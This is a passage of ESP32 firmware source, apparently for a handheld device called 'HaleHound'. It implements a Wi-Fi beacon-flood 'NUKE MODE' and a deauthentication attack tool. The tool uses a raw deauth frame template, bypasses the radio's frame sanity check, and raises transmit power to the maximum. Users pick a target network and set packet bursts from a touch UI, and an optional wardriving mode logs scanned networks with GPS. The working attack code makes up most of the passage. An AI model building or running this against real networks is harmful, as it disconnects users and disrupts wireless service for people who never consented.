    // NUKE MODE title with flashing effect
    tft.setTextSize(2);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(30, 25);
    tft.print("!! NUKE MODE !!");

    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(50, 50);
    tft.print("TAP TO EXIT");

    // Initialize nuke rain — MAXIMUM CHAOS, random X, insane speed
    initMatrixRain();
    for (int i = 0; i < RAIN_COLUMNS; i++) {
        rainDrops[i].x = random(5, SCREEN_WIDTH - 10);  // Random spread for density
        rainDrops[i].speed = random(6, 12);              // INSANE speed
        rainDrops[i].y = RAIN_AREA_TOP - random(10, 60); // Tight stagger — all at once
    }

    unsigned long lastCloudRedraw = 0;

    // Random character pool for SSID generation
    String charPool = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_";
    uint32_t nukeCount = 0;
    unsigned long lastUpdate = 0;
    unsigned long lastFlash = 0;
    bool flashState = false;

    // NUKE loop - all channels, random SSIDs, CHAOS
    while (true) {
        // Check for touch to exit
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            while (isTouched()) { delay(10); }  // Wait for release
            break;
        }

        // Random channel
        byte channel = random(1, 13);
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

        // Randomize all MAC bytes
        for (int i = 10; i <= 21; i++) {
            packet[i] = random(256);
        }

        // Generate random 6-char SSID
        for (int i = 38; i <= 43; i++) {
            packet[i] = charPool[random(charPool.length())];
        }
        packet[37] = 6;  // SSID length
        packet[56] = channel;

        // Send 3x for reliability
        esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
        esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
        esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
        nukeCount += 3;

        // Update matrix rain (30ms throttle — keeps visuals without stealing TX time)
        if (millis() - lastUpdate > 30) {
            updateMatrixRain();
            lastUpdate = millis();
        }

        // Redraw mushroom cloud every 500ms (was 100ms — major TX time savings)
        if (millis() - lastCloudRedraw > 500) {
            tft.drawBitmap(nukeX, nukeY, bitmap_nuke_cloud_xl, NUKE_CLOUD_XL_WIDTH, NUKE_CLOUD_XL_HEIGHT, 0x5000);
            lastCloudRedraw = millis();
        }

        // Flash the title for chaos effect
        if (millis() - lastFlash > 200) {
            flashState = !flashState;
            tft.setTextSize(2);
            tft.setTextColor(flashState ? HALEHOUND_HOTPINK : 0x041F);
            tft.setCursor(30, 25);
            tft.print("!! NUKE MODE !!");

            // Update nuke counter
            tft.setTextSize(1);
            tft.setTextColor(HALEHOUND_BRIGHT);
            tft.fillRect(0, 50, SCREEN_WIDTH, 10, HALEHOUND_BLACK);
            tft.setCursor(10, 50);
            tft.print("TX: ");
            tft.print(nukeCount);
            tft.print("  TAP TO EXIT");

            lastFlash = millis();
        }
    }

    #if CYD_DEBUG
    Serial.println("[BEACON] NUKE MODE DEACTIVATED");
    #endif
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    spamming = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(50);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(50);
    initialized = false;
    exitRequested = false;

    #if CYD_DEBUG
    Serial.println("[BEACON] Cleanup complete");
    #endif
}

}  // namespace BeaconSpammer


// ═══════════════════════════════════════════════════════════════════════════
// SHARED WIFI UTILITIES
// ═══════════════════════════════════════════════════════════════════════════

void wifiPromiscuousInit() {
    nvs_flash_init();
    tcpip_adapter_init();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
    ESP_ERROR_CHECK(esp_wifi_start());
}

void wifiAPInit() {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
}

void wifiCleanup() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(50);
}


// ═══════════════════════════════════════════════════════════════════════════
// DEAUTHER IMPLEMENTATION
// ═══════════════════════════════════════════════════════════════════════════

namespace Deauther {

// Deauthentication frame template
static uint8_t deauth_frame_default[26] = {
    0xC0, 0x00,                         // type, subtype c0: deauth
    0x00, 0x00,                         // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // receiver (target)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
    0x00, 0x00,                         // fragment & sequence
    0x01, 0x00                          // reason code
};
static uint8_t deauth_frame[sizeof(deauth_frame_default)];

// State variables
static bool initialized = false;
static bool exitRequested = false;
static bool attackRunning = false;
static bool scanning = false;
static bool wardrivingEnabled = false;  // Wardriving mode toggle

static uint32_t packetCount = 0;
static uint32_t successCount = 0;
static uint32_t consecutiveFailures = 0;
static uint32_t lastPacketTime = 0;

static wifi_ap_record_t selectedAp;
static uint8_t selectedChannel = 0;
static int selectedApIndex = -1;
static int networkCount = 0;
static wifi_ap_record_t* apList = nullptr;

static int currentPage = 0;
static int highlightedIndex = 0;
static int packetsPerBurst = 10;
static const int networksPerPage = 14;  // MATCHES ORIGINAL ESP32-DIV

// Pre-set target from WifiScan handoff
static bool targetPreset = false;

// Track whether we're in raw ESP-IDF APSTA mode (for deauth) vs Arduino mode (for scan)
static bool inAttackMode = false;

// Switch to raw ESP-IDF APSTA mode for deauth frame injection
// esp_wifi_80211_tx(WIFI_IF_AP) requires an active AP interface
// Must call WiFi.mode(WIFI_OFF) first to cleanly shut down Arduino WiFi
static void initAttackMode() {
    WiFi.mode(WIFI_OFF);    // Clean Arduino shutdown, sets _esp_wifi_started=false
    delay(50);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(50);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_start();

    // Configure hidden AP so WIFI_IF_AP is actually active for raw frame TX
    // Without this, esp_wifi_80211_tx(WIFI_IF_AP, ...) silently fails
    wifi_config_t ap_config = {};
    strncpy((char*)ap_config.ap.ssid, "HaleHound", sizeof(ap_config.ap.ssid));
    ap_config.ap.ssid_len = 9;
    ap_config.ap.ssid_hidden = 1;
    ap_config.ap.max_connection = 0;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.beacon_interval = 60000;
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);

    esp_wifi_set_max_tx_power(82);
    esp_wifi_set_ps(WIFI_PS_NONE);
    inAttackMode = true;

    #if CYD_DEBUG
    Serial.println("[DEAUTH] initAttackMode: raw ESP-IDF APSTA + hidden AP ready");
    #endif
}

// Tear down raw ESP-IDF mode so Arduino WiFi works again for scanning
// After this, WiFi.mode(WIFI_STA) in scanNetworks() will properly reinit
static void exitAttackMode() {
    if (!inAttackMode) return;
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(50);
    inAttackMode = false;

    #if CYD_DEBUG
    Serial.println("[DEAUTH] exitAttackMode: raw ESP-IDF torn down");
    #endif
}

// Skull spinner state for attack animation
static int skullFrame = 0;

// All 8 skull menu icons in array
static const unsigned char* skullIcons[] = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};
static const int numSkulls = 8;

// Override Wi-Fi sanity check for raw frame injection
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// Send raw 802.11 frame
static void sendRawFrame(const uint8_t* frame, int size) {
    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame, size, false);
    packetCount++;
    if (res == ESP_OK) {
        successCount++;
        consecutiveFailures = 0;
    } else {
        consecutiveFailures++;
    }
}

// Send deauth frame to target
static void sendDeauthFrame(const wifi_ap_record_t* ap, uint8_t chan) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap->bssid, 6);  // Source: AP BSSID
    memcpy(&deauth_frame[16], ap->bssid, 6);  // BSSID
    deauth_frame[24] = 7;  // Reason code

    sendRawFrame(deauth_frame, sizeof(deauth_frame));
}

// Compare function for sorting APs by RSSI
static int compareAp(const void* a, const void* b) {
    wifi_ap_record_t* ap1 = (wifi_ap_record_t*)a;
    wifi_ap_record_t* ap2 = (wifi_ap_record_t*)b;
    return ap2->rssi - ap1->rssi;  // Descending order
}

// Draw button - HALEHOUND THEME (cyan text on dark bg)
static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
    uint16_t bgColor = disabled ? HALEHOUND_GUNMETAL : HALEHOUND_DARK;
    uint16_t borderColor = highlight ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;
    uint16_t textColor = highlight ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;

    tft.fillRect(x, y, w, h, bgColor);
    tft.drawRect(x, y, w, h, borderColor);
    tft.setTextColor(textColor, bgColor);
    tft.setTextSize(1);

    int16_t textWidth = strlen(label) * 6;
    int16_t textX = x + (w - textWidth) / 2;
    int16_t textY = y + (h - 8) / 2 + 2;
    tft.setCursor(textX, textY);
    tft.print(label);
}

// Draw tab bar at bottom - MATCHES ORIGINAL ESP32-DIV
static void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {
    tft.fillRect(0, 304, SCREEN_WIDTH, 16, HALEHOUND_GUNMETAL);

    if (leftButton[0]) {
        drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
    }
    if (prevButton[0]) {
        drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
    }
    if (nextButton[0]) {
        drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
    }
}

// Draw UI - MATCHES ORIGINAL ESP32-DIV (Deauther has 2 icons: rescan, back)
static void drawDeautherUI() {
#define DT_ICON_SIZE 16
    static int iconY = 20;

    // Icon bar background - HALEHOUND DARK
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_DARK);

    // Draw bitmap icons
    // Back at x=10, Wardriving at x=190, Rescan at x=220
    tft.drawBitmap(10, iconY, bitmap_icon_go_back, DT_ICON_SIZE, DT_ICON_SIZE, HALEHOUND_MAGENTA);
    tft.drawBitmap(220, iconY, bitmap_icon_undo, DT_ICON_SIZE, DT_ICON_SIZE, HALEHOUND_MAGENTA);

    // Wardriving toggle icon at x=190 (antenna icon - lit when active)
    uint16_t wdColor = wardrivingEnabled ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;
    tft.drawBitmap(190, iconY, bitmap_icon_antenna, DT_ICON_SIZE, DT_ICON_SIZE, wdColor);

    // Separator line at y=36
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
}

// Glitch title
static void drawHeader() {
    drawGlitchText(55, "DEAUTHER", &Nosifer_Regular10pt7b);
}

// Draw network list screen - CLEAN like WifiScan
static void drawScanScreen() {
    // Clear entire content area
    tft.fillRect(0, 37, SCREEN_WIDTH, SCREEN_HEIGHT - 37, HALEHOUND_BLACK);
    drawDeautherUI();
    drawHeader();

    tft.setTextSize(1);

    if (scanning) {
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(10, 68);
        tft.print("Scanning...");
        return;
    }

    if (networkCount == 0) {
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(10, 68);
        tft.print("No networks found");
        return;
    }

    // Header row
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 60);
    tft.print("Found: ");
    tft.print(networkCount);

    int totalPages = (networkCount + networksPerPage - 1) / networksPerPage;
    tft.setCursor(180, 60);
    tft.print("Pg");
    tft.print(currentPage + 1);
    tft.print("/");
    tft.print(totalPages);

    // Network list starting at y=72
    int y = 72;
    int startIdx = currentPage * networksPerPage;
    int endIdx = min(startIdx + networksPerPage, networkCount);

    for (int i = startIdx; i < endIdx && y < 295; i++) {
        // Highlight selected row
        if (i == highlightedIndex && selectedApIndex == -1) {
            tft.fillRect(0, y - 1, SCREEN_WIDTH, 16, HALEHOUND_DARK);
            tft.setTextColor(HALEHOUND_HOTPINK);
        } else if (apList[i].authmode == WIFI_AUTH_OPEN) {
            tft.setTextColor(HALEHOUND_HOTPINK);
        } else {
            tft.setTextColor(0x07FF);  // Bright cyan
        }

        // Network number
        tft.setCursor(2, y);
        if (i + 1 < 10) tft.print("0");
        tft.print(i + 1);
        tft.print(" ");

        // SSID (max 14 chars)
        char ssid[15];
        strncpy(ssid, (char*)apList[i].ssid, 14);
        ssid[14] = '\0';
        tft.print(ssid);

        // RSSI on right side
        tft.setCursor(180, y);
        tft.print(apList[i].rssi);
        tft.print(" ");
        tft.print(apList[i].primary);

        y += 16;  // 16px row spacing
    }

    // Bottom tab bar
    bool prevDisabled = currentPage == 0;
    bool nextDisabled = (currentPage + 1) * networksPerPage >= networkCount;
    drawTabBar("Rescan", false, "Prev", prevDisabled, "Next", nextDisabled);
}

// Draw row of skulls that flash in sequence - teal to pink wave - MATCHES ORIGINAL
static void drawSkullSpinner() {
    const int startX = 28;  // Center 8 skulls (8*16=128, (240-128)/2 = 56, but tighter)
    const int skullY = 195;
    const int spacing = 26;  // 16px icon + 10px gap

    if (attackRunning) {
        // Wave effect - each skull gets a different phase
        for (int i = 0; i < numSkulls; i++) {
            int phase = (skullFrame + i) % 8;

            // Gradient from teal to pink based on phase
            uint16_t skullColor;
            if (phase < 4) {
                // Teal to pink transition
                float ratio = phase / 3.0f;
                uint8_t r = (uint8_t)(ratio * 255);
                uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
                uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
                skullColor = tft.color565(r, g, b);
            } else {
                // Pink to teal transition
                float ratio = (phase - 4) / 3.0f;
                uint8_t r = 255 - (uint8_t)(ratio * 255);
                uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                skullColor = tft.color565(r, g, b);
            }

            int x = startX + (i * spacing);
            tft.fillRect(x, skullY, 16, 16, HALEHOUND_BLACK);
            tft.drawBitmap(x, skullY, skullIcons[i], 16, 16, skullColor);
        }
        skullFrame++;
    } else {
        // Idle - all gray
        for (int i = 0; i < numSkulls; i++) {
            int x = startX + (i * spacing);
            tft.fillRect(x, skullY, 16, 16, HALEHOUND_BLACK);
            tft.drawBitmap(x, skullY, skullIcons[i], 16, 16, HALEHOUND_GUNMETAL);
        }
    }
}

// Draw label above skulls - MATCHES ORIGINAL
static void drawSpinnerLabel() {
    tft.fillRect(10, 225, 220, 15, HALEHOUND_BLACK);
    tft.setCursor(85, 228);
    tft.setTextColor(attackRunning ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL);
    tft.setTextSize(1);
    tft.print(attackRunning ? "ATTACKING" : "IDLE");
}

// Lightweight stats update - only redraws stats area, not whole screen
static void updateAttackStats() {
    char buf[64];

    // Clear stats area only (y 112 to 162)
    tft.fillRect(10, 112, 200, 50, HALEHOUND_BLACK);

    // Status
    tft.setCursor(10, 112);
    tft.setTextColor(attackRunning ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL);
    tft.println(attackRunning ? "Status: Running" : "Status: Stopped");

    // Packets
    snprintf(buf, sizeof(buf), "Packets: %lu", packetCount);
    tft.setCursor(10, 127);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.println(buf);

    // Success rate
    float success_rate = (packetCount > 0) ? (float)successCount / packetCount * 100 : 0;
    snprintf(buf, sizeof(buf), "Success: %.1f%%", success_rate);
    tft.setCursor(10, 142);
    tft.println(buf);

    // Heap
    snprintf(buf, sizeof(buf), "Heap: %u", ESP.getFreeHeap());
    tft.setCursor(10, 157);
    tft.println(buf);
}

// Draw attack screen - MATCHES ORIGINAL ESP32-DIV EXACTLY
static void drawAttackScreen() {
    tft.drawLine(0, 19, tft.width(), 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 37, tft.width(), tft.height(), HALEHOUND_BLACK);
    tft.setTextSize(1);

    drawDeautherUI();
    drawHeader();

    char buf[64];

    // Target info
    tft.setTextColor(HALEHOUND_BRIGHT);
    snprintf(buf, sizeof(buf), "Target: %s", selectedAp.ssid);
    tft.setCursor(10, 62);
    tft.println(buf);

    tft.setTextColor(HALEHOUND_MAGENTA);
    snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             selectedAp.bssid[0], selectedAp.bssid[1], selectedAp.bssid[2],
             selectedAp.bssid[3], selectedAp.bssid[4], selectedAp.bssid[5]);
    tft.setCursor(10, 82);
    tft.println(buf);

    const char* auth;
    switch (selectedAp.authmode) {
        case WIFI_AUTH_OPEN: auth = "OPEN"; break;
        case WIFI_AUTH_WPA_PSK: auth = "WPA-PSK"; break;
        case WIFI_AUTH_WPA2_PSK: auth = "WPA2-PSK"; break;
        case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2-PSK"; break;
        default: auth = "Unknown"; break;
    }
    snprintf(buf, sizeof(buf), "Auth: %s", auth);
    tft.setCursor(10, 97);
    tft.println(buf);

    // Attack status
    tft.setCursor(10, 112);
    tft.setTextColor(attackRunning ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL);
    tft.println(attackRunning ? "Status: Running" : "Status: Stopped");

    // Stats
    snprintf(buf, sizeof(buf), "Packets: %lu", packetCount);
    tft.setCursor(10, 127);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.println(buf);

    float rate = (packetCount > 0) ? (float)successCount / packetCount * 100 : 0;
    snprintf(buf, sizeof(buf), "Success: %.1f%%", rate);
    tft.setCursor(10, 142);
    tft.println(buf);

    snprintf(buf, sizeof(buf), "Heap: %u", ESP.getFreeHeap());
    tft.setCursor(10, 157);
    tft.println(buf);

    // Packet burst selector: [-] count [+] - HALEHOUND THEME
    tft.setCursor(10, 182);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.print("Burst: ");

    // Draw [-] button
    tft.fillRect(70, 177, 30, 20, HALEHOUND_GUNMETAL);
    tft.drawRect(70, 177, 30, 20, HALEHOUND_MAGENTA);
    tft.setCursor(82, 182);
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.print("-");

    // Draw count
    tft.fillRect(105, 177, 40, 20, HALEHOUND_BLACK);
    tft.setCursor(115, 182);
    tft.setTextColor(HALEHOUND_HOTPINK);
    snprintf(buf, sizeof(buf), "%d", packetsPerBurst);
    tft.print(buf);

    // Draw [+] button
    tft.fillRect(150, 177, 30, 20, HALEHOUND_GUNMETAL);
    tft.drawRect(150, 177, 30, 20, HALEHOUND_MAGENTA);
    tft.setCursor(162, 182);
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.print("+");

    // Skull activity indicator - MATCHES ORIGINAL
    drawSkullSpinner();
    drawSpinnerLabel();

    // Bottom tab bar - MATCHES ORIGINAL
    const char* buttons[] = {attackRunning ? "Stop" : "Start", "Back"};
    drawTabBar(buttons[0], false, "", true, buttons[1], false);
}

bool scanNetworks() {
    Serial.println("[DEAUTH] ====== scanNetworks BEGIN ======");
    scanning = true;
    currentPage = 0;
    drawScanScreen();

    // If coming back from attack mode, tear down raw ESP-IDF first
    if (inAttackMode) {
        exitAttackMode();
    }

    // Use Arduino WiFi API for scanning — reliable, no event handler conflicts
    // Raw esp_wifi_scan_get_ap_records() gets results stolen by Arduino's
    // WIFI_EVENT_SCAN_DONE handler. WiFi.scanNetworks() works through that handler.
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks(false, true);  // blocking, show hidden
    Serial.printf("[DEAUTH] WiFi.scanNetworks found %d networks\n", n);

    if (n <= 0) {
        WiFi.scanDelete();
        scanning = false;
        networkCount = 0;
        return false;
    }

    // Free old list and allocate for new results
    if (apList) free(apList);
    networkCount = (n > 64) ? 64 : n;  // Cap to reasonable number
    apList = (wifi_ap_record_t*)malloc(networkCount * sizeof(wifi_ap_record_t));
    if (!apList) {
        networkCount = 0;
        WiFi.scanDelete();
        scanning = false;
        return false;
    }

    // Copy results from Arduino API into ESP-IDF struct (used by attack code)
    for (int i = 0; i < networkCount; i++) {
        memset(&apList[i], 0, sizeof(wifi_ap_record_t));
        uint8_t* bssid = WiFi.BSSID(i);
        if (bssid) memcpy(apList[i].bssid, bssid, 6);
        String ssid = WiFi.SSID(i);
        strncpy((char*)apList[i].ssid, ssid.c_str(), 32);
        apList[i].ssid[32] = '\0';
        apList[i].rssi = WiFi.RSSI(i);
        apList[i].primary = WiFi.channel(i);
        apList[i].authmode = (wifi_auth_mode_t)WiFi.encryptionType(i);
    }

    WiFi.scanDelete();

    qsort(apList, networkCount, sizeof(wifi_ap_record_t), compareAp);

    scanning = false;
    highlightedIndex = 0;

    Serial.printf("[DEAUTH] Scan complete: %d networks\n", networkCount);

    return true;
}

void setup() {
    #if CYD_DEBUG
    Serial.println("[DEAUTH] Initializing Deauther...");
    #endif

    // Always redraw screen on entry
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    exitRequested = false;

    // Skip hardware init if already done
    if (initialized) {
        // Just rescan and redraw
        scanNetworks();
        if (wardrivingEnabled && networkCount > 0) {
            gpsUpdate();
            wardrivingLogScan(apList, networkCount);
        }
        drawScanScreen();
        return;
    }

    // NVS init (needed once for WiFi subsystem)
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        nvs_flash_erase();
        nvs_flash_init();
    }

    // Check if target was pre-set from WifiScan handoff
    if (targetPreset) {
        // Skip scan, go directly to attack — need raw ESP-IDF APSTA for deauth
        initAttackMode();
        packetCount = 0;
        successCount = 0;
        skullFrame = 0;
        drawAttackScreen();
        targetPreset = false;  // Clear flag after use
        initialized = true;
        return;
    }

    // Scan uses Arduino WiFi API (reliable — no event handler result stealing)
    // Raw ESP-IDF APSTA mode is only activated when user starts the attack
    scanNetworks();
    if (wardrivingEnabled && networkCount > 0) {
        gpsUpdate();
        wardrivingLogScan(apList, networkCount);
    }
    drawScanScreen();

    initialized = true;

    #if CYD_DEBUG
    Serial.println("[DEAUTH] Ready");
    #endif
}

void loop() {
    if (!initialized) return;

    // ═══════════════════════════════════════════════════════════════════════
    // ICON BAR TOUCH HANDLING - MUST BE BEFORE touchButtonsUpdate()!
    // Icons at: Back x=10, Wardriving x=190, Rescan x=220 (all 16px wide)
    // ═══════════════════════════════════════════════════════════════════════
    static unsigned long lastIconTap = 0;
    if (millis() - lastIconTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            // Icon bar area (y=20-36)
            if (ty >= 20 && ty <= 36) {
                // Back icon at x=5-30
                if (tx >= 5 && tx <= 30) {
                    if (selectedApIndex != -1) {
                        attackRunning = false;
                        selectedApIndex = -1;
                        exitAttackMode();  // Tear down raw ESP-IDF so Arduino scan works
                        scanNetworks();    // Rescan with Arduino WiFi
                        drawScanScreen();
                    } else {
                        exitRequested = true;
                    }
                    while (isTouched()) { delay(10); }  // Wait for finger lift
                    lastIconTap = millis();
                    return;
                }
                // Wardriving toggle icon at x=175-210 (around antenna at x=190)
                else if (tx >= 175 && tx <= 210) {
                    wardrivingEnabled = !wardrivingEnabled;
                    if (wardrivingEnabled) {
                        gpsSetup();  // Init GPS if not already
                        if (!wardrivingStart()) {
                            // SD card failed - disable wardriving
                            wardrivingEnabled = false;
                        }
                    } else {
                        wardrivingStop();
                    }
                    drawDeautherUI();  // Redraw icon bar
                    drawScanScreen();
                    while (isTouched()) { delay(10); }  // Wait for finger lift
                    lastIconTap = millis();
                    return;
                }
                // Rescan icon at right edge
                else if (tx >= (tft.width() - 25) && tx <= tft.width()) {
                    if (selectedApIndex == -1) {
                        scanNetworks();
                        // Log to wardriving if enabled
                        if (wardrivingEnabled && networkCount > 0) {
                            gpsUpdate();  // Get fresh GPS data
                            wardrivingLogScan(apList, networkCount);
                        }
                        drawScanScreen();
                    }
                    while (isTouched()) { delay(10); }  // Wait for finger lift
                    lastIconTap = millis();
                    return;
                }
            }
        }
    }

    // Update button states AFTER icon bar handling
    touchButtonsUpdate();

    if (selectedApIndex == -1) {
        // === SCAN SCREEN ===

        if (buttonPressed(BTN_UP)) {
            if (networkCount > 0 && highlightedIndex > 0) {
                highlightedIndex--;
                if (highlightedIndex < currentPage * networksPerPage) {
                    currentPage--;
                }
                drawScanScreen();
            }
        }

        if (buttonPressed(BTN_DOWN)) {
            if (networkCount > 0 && highlightedIndex < networkCount - 1) {
                highlightedIndex++;
                if (highlightedIndex >= (currentPage + 1) * networksPerPage) {
                    currentPage++;
                }
                drawScanScreen();
            }
        }

        if (buttonPressed(BTN_LEFT)) {
            if (currentPage > 0) {
                currentPage--;
                highlightedIndex = currentPage * networksPerPage;
                drawScanScreen();
            }
        }

        if (buttonPressed(BTN_RIGHT)) {
            int totalPages = (networkCount + networksPerPage - 1) / networksPerPage;
            if (currentPage < totalPages - 1) {
                currentPage++;
                highlightedIndex = currentPage * networksPerPage;
                drawScanScreen();
            }
        }

        if (buttonPressed(BTN_SELECT)) {
            if (networkCount > 0 && highlightedIndex < networkCount) {
                selectedApIndex = highlightedIndex;
                selectedAp = apList[highlightedIndex];
                selectedChannel = apList[highlightedIndex].primary;
                packetCount = 0;
                successCount = 0;
                if (!inAttackMode) initAttackMode();  // Switch to raw ESP-IDF for deauth
                drawAttackScreen();
            } else {
                // Rescan
                scanNetworks();
                if (wardrivingEnabled && networkCount > 0) {
                    gpsUpdate();
                    wardrivingLogScan(apList, networkCount);
                }
                drawScanScreen();
            }
        }

        // Touch to select network (y=72 to y=295 area - matches drawScanScreen layout)
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            // Network list touch (y=72 to y=295, 16px rows)
            if (!scanning && ty >= 72 && ty < 295 && networkCount > 0) {
                int index = (ty - 72) / 16 + (currentPage * networksPerPage);
                if (index >= 0 && index < networkCount) {
                    selectedApIndex = index;
                    selectedAp = apList[index];
                    selectedChannel = apList[index].primary;
                    packetCount = 0;
                    successCount = 0;
                    skullFrame = 0;
                    if (!inAttackMode) initAttackMode();  // Switch to raw ESP-IDF for deauth
                    drawAttackScreen();
                    delay(100);
                }
            }
            // Bottom tab bar touch (bottom 30px)
            else if (!scanning && ty >= (tft.height() - 30) && ty <= tft.height()) {
                // Rescan button: x=0-57
                if (tx >= 0 && tx <= 57) {
                    drawButton(0, 304, 57, 16, "Rescan", true, false);
                    delay(50);
                    if (scanNetworks()) {
                        if (wardrivingEnabled && networkCount > 0) {
                            gpsUpdate();
                            wardrivingLogScan(apList, networkCount);
                        }
                        highlightedIndex = 0;
                        currentPage = 0;
                        drawScanScreen();
                    }
                }
                // Prev button: x=117-174
                else if (tx >= 117 && tx <= 174) {
                    if (currentPage > 0) {
                        drawButton(117, 304, 57, 16, "Prev", true, false);
                        currentPage--;
                        if (highlightedIndex >= (currentPage + 1) * networksPerPage) {
                            highlightedIndex = (currentPage + 1) * networksPerPage - 1;
                        }
                        drawScanScreen();
                        delay(50);
                    }
                }
                // Next button: x=177-234
                else if (tx >= 177 && tx <= 234) {
                    if ((currentPage + 1) * networksPerPage < networkCount) {
                        drawButton(177, 304, 57, 16, "Next", true, false);
                        currentPage++;
                        if (highlightedIndex < currentPage * networksPerPage) {
                            highlightedIndex = currentPage * networksPerPage;
                        }
                        drawScanScreen();
                        delay(50);
                    }
                }
            }
        }

    } else {
        // === ATTACK SCREEN ===

        // Touch handling for attack screen - MATCHES ORIGINAL
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            // [-] button: decrease packet burst count (x=70-100, y=177-197)
            if (ty >= 177 && ty <= 197 && tx >= 70 && tx <= 100) {
                if (packetsPerBurst > 1) {
                    packetsPerBurst -= (packetsPerBurst >= 10) ? 5 : 1;
                    if (packetsPerBurst < 1) packetsPerBurst = 1;
                    drawAttackScreen();
                    delay(100);
                }
            }
            // [+] button: increase packet burst count (x=150-180, y=177-197)
            else if (ty >= 177 && ty <= 197 && tx >= 150 && tx <= 180) {
                if (packetsPerBurst < 100) {
                    packetsPerBurst += (packetsPerBurst >= 10) ? 5 : 1;
                    if (packetsPerBurst > 100) packetsPerBurst = 100;
                    drawAttackScreen();
                    delay(100);
                }
            }
            // Bottom tab bar (bottom 30px)
            else if (ty >= (tft.height() - 30) && ty <= tft.height()) {
                // Start/Stop button: x=0-57
                if (tx >= 0 && tx <= 57) {
                    drawButton(0, 304, 57, 16, attackRunning ? "Stop" : "Start", true, false);
                    attackRunning = !attackRunning;
                    if (attackRunning) {
                        // Starting new attack - reset all counters
                        packetCount = 0;
